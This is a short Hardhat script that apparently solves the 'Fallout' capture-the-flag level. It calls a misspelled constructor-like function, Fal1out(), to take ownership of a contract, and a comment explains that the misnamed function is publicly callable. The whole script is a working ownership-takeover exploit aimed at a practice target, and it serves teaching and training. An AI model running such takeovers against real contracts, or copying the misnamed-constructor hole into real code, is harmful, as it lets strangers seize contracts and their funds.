import { Contract } from "ethers";
import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/Fallout.sol/Fallout.json";

function setFalloutContract() {
  const contractAddress = "0xD1015f7087B535c28fB8534395Adcf06725BAa18";
  return new Contract(contractAddress, abi);
}

async function main() {
  const fallout = setFalloutContract();
  const [attacker] = await ethers.getSigners();
  const pendingTx = await fallout.connect(attacker).Fal1out();
  await pendingTx.wait();
  console.log(
    "Success: ",
    (await fallout.connect(attacker).owner()) === attacker.address
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
In previous version of solidity, the constructor was named after the name of 
the contract. Here Fal1out is mispelled, thus it is a regular public function,
callable by anyone.
*/
